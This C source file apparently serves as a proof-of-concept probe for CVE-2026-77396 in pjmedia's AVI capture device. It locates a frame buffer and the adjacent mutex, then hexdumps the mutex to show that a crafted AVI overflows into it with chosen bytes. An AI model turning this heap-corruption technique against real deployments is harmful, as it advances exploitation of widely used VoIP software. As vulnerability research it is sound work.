/* Natural shipped-caller probe for CVE-2026-77396.
 *
 * Uses only shipped pjmedia APIs: pjmedia_avi_dev_create_factory(),
 * pjmedia_avi_dev_alloc() (AVI virtual capture device), and
 * pjmedia_vid_port_create().  vid_port.c allocates vp->frm_buf->buf from a
 * fresh pool (:688) and then vp->frm_mutex from that same pool (:701), so
 * an AVI 00dc overflow at buf+48 reaches a live pj_mutex_t without any
 * driver-supplied victim.  The shadow struct below mirrors the private
 * struct pjmedia_vid_port in vid_port.c:74-115 only to READ those addresses.
 *
 * argv[1] = AVI path.  No wire, no command, no pointer call.
 */
#include <pjlib.h>
#include <pjmedia.h>
#include <pjmedia/vid_port.h>
#include <pjmedia/videodev.h>
#include <pjmedia-videodev/avi_dev.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define CHECK(call, label) do {                                            \
    pj_status_t _s = (call);                                               \
    if (_s != PJ_SUCCESS) {                                                \
        char _err[PJ_ERR_MSG_SIZE];                                        \
        pj_strerror(_s, _err, sizeof(_err));                               \
        fprintf(stderr, "FAIL %s: %s\n", label, _err);                     \
        return 2;                                                          \
    }                                                                      \
} while (0)

/* Mirror of pjmedia/src/pjmedia/vid_port.c:74-115 for address readback. */
enum probe_role { ROLE_ACTIVE_PROBE, ROLE_PASSIVE_PROBE };
struct probe_vid_port {
    pj_pool_t               *pool;
    pj_str_t                 dev_name;
    pjmedia_dir              dir;
    pjmedia_vid_dev_stream  *strm;
    pjmedia_vid_dev_cb       strm_cb;
    void                    *strm_cb_data;
    enum probe_role          role, stream_role;
    void                    *pasv_port;
    pjmedia_port            *client_port;
    pj_bool_t                destroy_client_port;
    struct {
        pjmedia_converter       *conv;
        void                    *conv_buf;
        pj_size_t                conv_buf_size;
        pjmedia_conversion_param conv_param;
        unsigned                 usec_ctr;
        unsigned                 usec_src, usec_dst;
    } conv;
    pjmedia_clock           *clock;
    pjmedia_clock_src        clocksrc;
    pjmedia_event            fmt_event;
    struct {
        pjmedia_clock_src   *sync_clocksrc;
        pj_int32_t           sync_delta;
        unsigned             max_sync_ticks;
        unsigned             nsync_frame;
        unsigned             nsync_progress;
    } sync_clocksrc;
    pjmedia_frame           *frm_buf;
    pj_size_t                frm_buf_size;
    pj_mutex_t              *frm_mutex;
    pj_size_t                src_size;
};

static void hexdump(const char *label, const unsigned char *p, size_t n)
{
    fprintf(stderr, "%s:", label);
    for (size_t i = 0; i < n; ++i)
        fprintf(stderr, "%02x", p[i]);
    fprintf(stderr, "\n");
}

int main(int argc, char **argv)
{
    pj_caching_pool cp;
    pj_pool_t *pool;
    pjmedia_vid_dev_factory *factory = NULL;
    pjmedia_vid_dev_index cap_id;
    pjmedia_vid_dev_info di;
    pjmedia_vid_dev_param dev_param;
    pjmedia_avi_dev_param ap;
    pjmedia_vid_port_param vp_param;
    pjmedia_vid_port *vp;
    pjmedia_port *sink;
    struct probe_vid_port *shadow;
    unsigned char *buf;
    pj_mutex_t *mutex;
    long delta;
    pj_status_t status;

    if (argc < 2) {
        fprintf(stderr, "usage: %s AVI\n", argv[0]);
        return 2;
    }
    CHECK(pj_init(), "pj_init");
    pj_caching_pool_init(&cp, NULL, 0);
    pool = pj_pool_create(&cp.factory, "vidport-probe", 4096, 4096, NULL);
    if (!pool)
        return 2;
    if (!pjmedia_video_format_mgr_instance())
        CHECK(pjmedia_video_format_mgr_create(pool, 64, 0, NULL), "vfmgr");
    CHECK(pjmedia_vid_dev_subsys_init(&cp.factory), "viddev subsys");
    CHECK(pjmedia_avi_dev_create_factory(&cp.factory, 2, &factory),
          "avi dev factory");

    pjmedia_avi_dev_param_default(&ap);
    ap.path = pj_str(argv[1]);
    CHECK(pjmedia_avi_dev_alloc(factory, &ap, &cap_id), "avi dev alloc");
    CHECK(pjmedia_vid_dev_get_info(cap_id, &di), "dev info");
    CHECK(pjmedia_vid_dev_default_param(pool, cap_id, &dev_param),
          "dev default param");
    fprintf(stderr, "DEVICE=%s driver=%s fmt=%08x %ux%u\n",
            di.name, di.driver, (unsigned)di.fmt[0].id,
            (unsigned)di.fmt[0].det.vid.size.w,
            (unsigned)di.fmt[0].det.vid.size.h);

    pjmedia_vid_port_param_default(&vp_param);
    vp_param.active = PJ_TRUE;
    vp_param.vidparam = dev_param;
    CHECK(pjmedia_vid_port_create(pool, &vp_param, &vp), "vid port create");

    shadow = (struct probe_vid_port *)vp;
    buf = (unsigned char *)shadow->frm_buf->buf;
    mutex = shadow->frm_mutex;
    delta = (long)(((unsigned char *)mutex) - buf);
    fprintf(stderr, "NATURAL frm_buf=%p size=%zu frm_mutex=%p delta=%ld\n",
            (void *)buf, (size_t)shadow->frm_buf_size, (void *)mutex, delta);
    hexdump("MUTEX_BEFORE", (const unsigned char *)mutex, 88);

    /* Let the shipped active clock drive the AVI pull into its own frame
     * buffer; a null port is the clock's sink. */
    CHECK(pjmedia_null_port_create(pool, 8000, 1, 160, 16, &sink), "null sink");
    CHECK(pjmedia_vid_port_connect(vp, sink, PJ_FALSE), "connect sink");
    status = pjmedia_vid_port_start(vp);
    fprintf(stderr, "START status=%d\n", (int)status);
    pj_thread_sleep(150);
    fprintf(stderr, "FRAME_SIZE_AFTER=%u\n",
            (unsigned)shadow->frm_buf->size);
    hexdump("MUTEX_AFTER", (const unsigned char *)mutex, 88);
    fflush(stderr);
    pj_thread_sleep(250);

    /* The mutex object may now hold chosen bytes; skip library teardown
     * so the observed state cannot be altered by pthread_mutex_destroy(). */
    _exit(0);
}
